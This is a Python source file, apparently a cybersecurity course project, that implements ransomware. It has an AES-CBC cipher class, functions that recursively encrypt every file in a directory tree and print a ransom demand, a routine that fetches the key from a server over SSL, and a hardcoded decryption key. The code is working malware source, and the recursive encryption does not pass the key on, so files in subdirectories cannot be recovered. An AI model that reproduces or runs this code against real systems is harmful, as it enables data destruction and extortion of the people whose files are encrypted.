import base64
from Crypto.Cipher import AES
from Crypto import Random
import random
import os
from pathlib import Path
import socket
import ssl

BS = AES.block_size
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode("utf-8")
unpad = lambda s : s[:-ord(s[len(s)-1:])]

class AESCipher:
    def __init__(self, key=None):
        if key == None:
            self.key = AESCipher.generate_key().encode("utf-8")
        else:
            self.key = str(key).encode("utf-8")

    @staticmethod
    def generate_key():
        chaset = "abcdefghijklmnopqrstuvwxyz123456789!@#$%^&*"
        k = ""
        for i in range(32):
            k += random.choice(chaset)
        return k

    def encrypt( self, raw ):
        raw = pad(raw) # Padding raw text to fit AES block size, encoding it on the way
        iv = Random.new().read( AES.block_size ) # Create more random bytes to merge with the secret key
        cipher = AES.new( self.key, AES.MODE_CBC, iv ) # Create AES key
        encrypted_text = cipher.encrypt( raw) # Encyrpt text
        return base64.b64encode(iv +  encrypted_text) # Return encrypted text with base64 encoding

    def decrypt( self, enc ):
        enc = base64.b64decode(enc) # Decode through base64
        encrypted_text = enc[BS:] # Reads encrypted text
        iv = enc[:BS] # Reads random bytes from the encryption
        cipher = AES.new(self.key, AES.MODE_CBC, iv ) # Creates the key that was used to encrypt
        return unpad(cipher.decrypt( encrypted_text )) # Decrypts text and unpads it


class Ransomware_Client:
    def __init__(self, key = None):
        self.encryptor = AESCipher(key)

    def encrypt_file(self, file_path):
        text = self.read_file(file_path) # Read file content
        encrypted_text = self.encryptor.encrypt(text) # Encrypt
        self.write_file(file_path, encrypted_text) # Write it back to the file

    def decrypt_file(self, file_path):
        encrypted_text = self.read_file(file_path) # Read encrypted content
        text = self.encryptor.decrypt(encrypted_text) # Decrypt
        self.write_file(file_path, text) # Write it back to the file

    def read_file(self, file_path):
        with open(file_path, "rb") as f:
            text = f.read()
            return text

    def write_file(self, file_path, content):
        with open(file_path, "wb") as f:
            f.write(content)

def encrypt_directory_content(dir_path, key = None):
    ransomware = Ransomware_Client(key)
    dir_path = Path(dir_path)
    for item in dir_path.iterdir():
        if item.is_file():
            ransomware.encrypt_file(item)
        else:
            encrypt_directory_content(item)
    print("Files encrypted! Pay 1000000$ to get them back")

def decrypt_directory_content(dir_path, key = None):
    ransomware = Ransomware_Client(key)
    dir_path = Path(dir_path)
    for item in dir_path.iterdir():
        if item.is_file():
            ransomware.decrypt_file(item)
        else:
            decrypt_directory_content(item, ransomware.encryptor.key)
    print("Files decrypted.")

def get_key_from_serv(server_host, server_port):
    s = socket.socket()
    ssl_sock = ssl.wrap_socket(s)
    ssl_sock.connect((server_host, server_port))
    print(f"Client has connected to {server_host}:{server_port}")
    key = ssl_sock.recv(1024).decode()
    print("Key received")
    ssl_sock.close()
    return key



# Custom key encryption - you choose key:
# ransomware = Ransomware_Client(key="Hellothisiskey12")

# Random key encryption - random key generator:
# ransomware = Ransomware_Client()

# Encrypt Directory:
if __name__ == "__main__":
    os.chdir(Path(__file__).resolve().parent) # Change directory to this script's directory
    dir_path = r"C:\Users\IDO123\Desktop\Projects\python\CyberCourse\Projects\TestDir"
    # encrypt_directory_content(dir_path, get_key_from_serv("127.0.0.1", 8080)) # Encrypt files
    # decrypt_directory_content( dir_path, "ag1^gz3d#ajb!!ci5j6t92xt8jh$ucr*" ) # Decrypt files